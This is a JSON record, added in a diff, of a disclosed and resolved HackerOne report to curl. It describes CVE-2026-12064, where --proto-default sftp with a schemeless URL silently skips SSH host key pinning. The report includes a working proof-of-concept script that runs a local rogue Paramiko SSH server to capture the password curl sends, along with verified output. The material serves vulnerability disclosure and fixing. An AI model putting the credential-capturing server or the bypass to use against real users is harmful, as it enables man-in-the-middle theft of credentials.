@@ -1,0 +1,113 @@
+{
+  "id": 3797526,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzk3NTI2",
+  "url": "https://hackerone.com/reports/3797526",
+  "title": "CVE-2026-12064: proto-default skips SSH verification",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2026-06-12T02:55:28.111Z",
+  "submitted_at": "2026-06-12T02:55:28.969Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alienowo",
+    "url": "/alienowo",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-12064"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-24T08:29:28.157Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-24T06:14:20.824Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nWhen a user invokes curl with a schemeless URL and `--proto-default sftp` (or `scp`), the tool layer guesses the URL is HTTP and skips setting SSH security options (`CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`, `CURLOPT_SSH_KNOWNHOSTS`). However libcurl's runtime correctly applies `--proto-default` and connects via SFTP/SCP. The result is that `--hostpubsha256`, `--hostpubmd5`, and `--knownhosts` are silently ignored — curl connects to an unverified SSH host and sends authentication credentials.\n\nA network MITM attacker running a rogue SSH server captures the victim's password or triggers key-based auth against an attacker-controlled host, while curl reports no host key error.\n\n### Affected version\n\nIntroduced in commit `f97d372703` (2025-05-15, \"tool_operate: move config2setopts to separate file\"), first released in **curl 8.14.0**. Present through current master (8.21.0-DEV).\n\n### Root cause\n\nIn `src/config2setopts.c`, `url_proto_and_rewrite()` uses `CURLU_GUESS_SCHEME` to determine `use_proto`. For a schemeless URL like `host:2222/path`, it guesses HTTP. The SSH options gate on this guess:\n\n```c\n// src/config2setopts.c:190\nif(use_proto != proto_scp && use_proto != proto_sftp)\n  return CURLE_OK;  // skips setting CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256, CURLOPT_SSH_KNOWNHOSTS, etc.\n```\n\nBut `CURLOPT_DEFAULT_PROTOCOL` is set later (line ~1053), and libcurl's `lib/url.c:1662` prepends `sftp://` at runtime. So the actual transfer uses SFTP with no host key verification configured.\n\n### Steps To Reproduce\n\nThe PoC starts a Paramiko SSH server, then runs curl twice: once with explicit `sftp://` (host key check works) and once with `--proto-default sftp` + schemeless URL (host key check bypassed, password captured).\n\nPrerequisites: `pip install paramiko`. Run from the curl source tree root (`~/curl/curl`).\n\n```bash\n#!/usr/bin/env bash\n# Run from the curl source root: ~/curl/curl\n# The local build at ./build-ssh/src/curl must have SFTP support (libssh2).\nset -e\n\nCURL_BIN=\"./build-ssh/src/curl\"\nexport LD_LIBRARY_PATH=\"/tmp/libssh2-install/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}\"\n\necho \"[*] Using: $CURL_BIN\"\n\"$CURL_BIN\" --version | head -2\nif ! \"$CURL_BIN\" --version | grep -q sftp; then\n  echo \"FATAL: $CURL_BIN does not have SFTP support.\"; exit 1\nfi\necho \"\"\n\npython3 - \"$CURL_BIN\" <<'PYEOF'\nimport os, sys, socket, threading, time, subprocess\n\nCURL_BIN = sys.argv[1]\n\nimport paramiko\nhost_key = paramiko.RSAKey.generate(2048)\nhost_fp_sha256 = \"SHA256:\" + __import__(\"base64\").b64encode(\n    __import__(\"hashlib\").sha256(host_key.asbytes()).digest()\n).decode().rstrip(\"=\")\n\nWRONG_PIN = \"SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\ncaptured_creds = []\n\nclass RogueServer(paramiko.ServerInterface):\n    def check_auth_password(self, username, password):\n        captured_creds.append(f\"{username}:{password}\")\n        return paramiko.AUTH_FAILED\n    def check_channel_request(self, kind, chanid):\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\n    def get_allowed_auths(self, username):\n        return \"password\"\n\ndef run_ssh_server(sock):\n    conn, addr = sock.accept()\n    transport = paramiko.Transport(conn)\n    transport.add_server_key(host_key)\n    try:\n        transport.start_server(server=RogueServer())\n        time.sleep(3)\n    except Exception:\n        pass\n    finally:\n        transport.close()\n        conn.close()\n\ndef run_curl(args):\n    env = os.environ.copy()\n    return subprocess.run(\n        [CURL_BIN, \"-q\", \"--silent\", \"--show-error\", \"--max-time\", \"5\",\n         \"--user\", \"victim:Secret123\"] + args,\n        text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10, env=env)\n\nsrv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsrv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nsrv_sock.bind((\"127.0.0.1\", 0))\nsrv_sock.listen(1)\nPORT = srv_sock.getsockname()[1]\n\nprint(f\"Rogue SSH server on 127.0.0.1:{PORT}\")\nprint(f\"Real fingerprint: {host_fp_sha256}\")\nprint(f\"Wrong pin:        {WRONG_PIN}\\n\")\n\n# Test 1: explicit sftp:// with wrong pin — should REJECT and NOT send password\ncaptured_creds.clear()\nt = threading.Thread(target=run_ssh_server, args=(srv_sock,), daemon=True)\nt.start()\np1 = run_curl([\"--hostpubsha256\", WRONG_PIN, f\"sftp://127.0.0.1:{PORT}/tmp/file\"])\nt.join(timeout=5)\nprint(f\"[explicit sftp://] exit={p1.returncode}\")\nprint(f\"  stderr: {p1.stderr.strip()[:200]}\")\nprint(f\"  creds captured: {captured_creds or '<none>'}\")\n\n# Test 2: --proto-default sftp + schemeless URL — BUG: skips pin, sends password\ncaptured_creds.clear()\nt = threading.Thread(target=run_ssh_server, args=(srv_sock,), daemon=True)\nt.start()\np2 = run_curl([\"--proto-default\", \"sftp\", \"--hostpubsha256\", WRONG_PIN,\n               f\"127.0.0.1:{PORT}/tmp/file\"])\nt.join(timeout=5)\nprint(f\"\\n[--proto-default sftp] exit={p2.returncode}\")\nprint(f\"  stderr: {p2.stderr.strip()[:200]}\")\nprint(f\"  creds captured: {captured_creds or '<none>'}\")\n\nsrv_sock.close()\n\nprint(\"\\n--- RESULT ---\")\nif p1.returncode == 60 and captured_creds == ['victim:Secret123']:\n    print(\"VULNERABLE: --proto-default sftp bypassed host key pin\")\n    print(f\"  Password sent to rogue server: {captured_creds}\")\nelif p1.returncode == 60 and not captured_creds:\n    print(\"NOT VULNERABLE: both paths correctly rejected the wrong pin.\")\nelse:\n    print(f\"UNEXPECTED: test1_exit={p1.returncode}, test2_creds={captured_creds}\")\nPYEOF\n```\n\nVerified output on curl 8.21.0-DEV (libcurl/8.21.0-DEV OpenSSL/3.0.13 libssh2/1.11.2_DEV):\n\n```text\n[*] Built curl:\ncurl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.0.13 libssh2/1.11.2_DEV\nProtocols: ... scp sftp ...\n\nRogue SSH server on 127.0.0.1:46363\nReal fingerprint: SHA256:sBclp/HMFOJgNTOMMo5kDDg4bXCXVGcjStynZwsyiy4\nWrong pin:        SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n[explicit sftp://] exit=60\n  stderr: curl: (60) Denied establishing ssh session: mismatch SHA256 fingerprint. Remote sBclp/HMFOJgNTOMMo5kDDg4bXCXVGcjStynZwsyiy4= is not equal to SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n  creds captured: <none>\n\n[--proto-default sftp] exit=67\n  stderr: curl: (67) Authentication failure\n  creds captured: ['victim:Secret123']\n\n--- RESULT ---\nVULNERABLE: --proto-default sftp bypassed host key pin\n  Password sent to rogue server: ['victim:Secret123']\n```\n\n### Expected behavior\n\n`--hostpubsha256` (and `--knownhosts`) must be applied regardless of whether the SFTP scheme comes from the URL directly or from `--proto-default`. The host key mismatch should abort the connection before any authentication attempt.\n\n### Actual behavior\n\nWith `--proto-default sftp` and a schemeless URL, the host key pin is silently discarded. curl proceeds to authenticate against the unverified host, sending the password to whatever SSH server answers at that address.\n\n## Impact\n\n## Summary:\nA MITM attacker on the network path intercepts the SSH connection and presents their own host key. Because curl skipped the pin check, the victim's password (or other credential) is sent to the attacker's rogue SSH server (requires explicit command-line passing). The user believes they are protected by `--hostpubsha256` but the protection is silently absent.\n\nThis is a credential disclosure to a MITM — the user explicitly requested host verification, curl silently failed to enforce it, and the credential crossed the trust boundary to an unverified endpoint.",
+  "weakness": {
+    "id": 28,
+    "name": "Improper Certificate Validation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
